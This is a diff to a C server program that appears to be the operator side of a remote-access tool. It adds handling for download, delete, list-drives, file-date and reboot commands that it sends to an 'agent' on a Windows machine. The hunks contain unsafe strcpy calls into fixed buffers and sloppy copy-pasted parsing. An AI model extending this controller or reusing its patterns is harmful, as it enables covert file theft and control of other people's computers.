@@ -34,6 +34,8 @@ int main(void){
 		return -1;
 
 	}
+	int yes = 1;
+	setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));
 
 	//declare a pointer to sockaddr_in struct and allocate memory for it
 	struct sockaddr_in *server_address = malloc(sizeof(struct sockaddr_in));
@@ -158,20 +160,36 @@ ACCEPT:
 			UploadFile(cmd,client_socket,FileNameToUpload,FullWindowsPath);		//Server will send, agent will receive
 			continue;
 		}
-		else if ( strncmp(cmd,"download",9) == 0){
+		else if ( strncmp(cmd,"download",8) == 0){
 			printf("going to Handle func\n");
 			// Parse the buffer
 			char* space_pos_download = strchr(cmd, ' ');
 			if (space_pos_download == NULL) {
 				continue;
 			}
-			printf("[+] THE file to be downloaded is %s\n", space_pos_download + 1);		//DEBUG
+			char remainder_copy[1024];
+			strcpy(remainder_copy, space_pos_download + 1);
+			// First token is the filename
+			char * FileNameToDownload  = strtok(remainder_copy, " ");
+			if (FileNameToDownload == NULL) {
+			    printf("[x] Missing filename\n");
+			    continue;
+			}
+
+			// Second token is the Windows path
+			char* SavePath = strtok(NULL, "\0");  // Get everything until newline
+			if (SavePath == NULL) {
+			    printf("[x] Missing linux path\n");
+			    continue;
+			}
+			//printf("[+] THE file to be downloaded is %s\n", space_pos_download + 1);		//DEBUG
 			// 
 			// will use basename() to get the filename to write with linux fs bullshit
-			char * FileNameToDownload = basename(space_pos_download + 1);
+			//char * FileNameToDownload = space_pos_download + 1;
 
-			printf("[+] The file with basename() is %s\n",FileNameToDownload);
-			//DownloadFile(cmd,client_socket,FileNameToDownload);	//Server will receive, agent will send
+			printf("[+] The file to be downloaded is %s\n",FileNameToDownload);
+			printf("[+] The folder to be downloaded to is %s\n",SavePath);
+			DownloadFile(cmd,client_socket,FileNameToDownload,SavePath);	//Server will receive, agent will send
 			continue;
 		}
 
@@ -184,7 +202,7 @@ ACCEPT:
 			if (space_pos_delete == NULL) {
 				continue;
 			}
-			printf("[+] cmd = %s\ncmd_copy=%s\n", cmd, cmd_copy);		//DEBUG
+			//printf("[+] cmd = %s\ncmd_copy=%s\n", cmd, cmd_copy);		//DEBUG
 
 			char remainder_copy[1024];
 			strcpy(remainder_copy, space_pos_delete + 1);
@@ -196,10 +214,41 @@ ACCEPT:
 			    continue;
 			}
 			//printf("[+] File to delete will be %s\n",FileNameToDelete);	//DEBUG
-			DeleteRequestedFile(cmd, client_socket, FileNameToDelete);
+			HandleDelete(cmd, client_socket, FileNameToDelete);
 			continue;
 		}
 
+		else if (strcmp(cmd , "list drives") == 0){
+			printf("going to handle func\n");
+			HandleListDrives(cmd, client_socket);
+			continue;
+
+		}
+		else if ( strncmp(cmd,"GetDate",6) == 0){
+			printf("going to handle func\n");
+			// Parse the buffer
+			char cmd_copy[BUFFER_SIZE];
+			strcpy(cmd_copy,cmd);
+			char* space_pos_delete = strchr(cmd_copy, ' ');
+			if (space_pos_delete == NULL) {
+				continue;
+			}
+			//printf("[+] cmd = %s\ncmd_copy=%s\n", cmd, cmd_copy);		//DEBUG
+
+			char remainder_copy[1024];
+			strcpy(remainder_copy, space_pos_delete + 1);
+
+			// First token is the filename
+			char * FileNameToDelete = remainder_copy;
+			if (FileNameToDelete == NULL) {
+			    perror("[x] Missing filename");
+			    continue;
+			}
+			printf("[+] File to get date will be %s\n",FileNameToDelete);	//DEBUG
+			HandleGetFileDate(cmd, client_socket, FileNameToDelete);
+			continue;
+
+		}
 		else if ( strcmp(cmd,"reboot") == 0){
 			printf("going to Handle func\n");
 			HandleReboot(cmd,client_socket);
@@ -244,12 +293,6 @@ ACCEPT:
 
 
 	return 0;
-
-
-
-
-
-
 }
 
 
